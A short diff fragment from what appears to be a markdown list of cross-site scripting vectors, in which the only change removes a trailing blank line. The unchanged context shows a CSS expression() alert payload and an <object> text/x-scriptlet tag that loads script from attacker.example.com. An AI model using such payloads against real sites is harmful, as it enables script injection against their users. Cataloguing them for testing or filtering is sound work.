@@ -34,4 +34,3 @@
     - `<div style="width: expression(alert('XSS'));">`
   - The `<object>` tag:
     - `<object type="text/x-scriptlet" data="http://attacker.example.com/xss.html">`
-
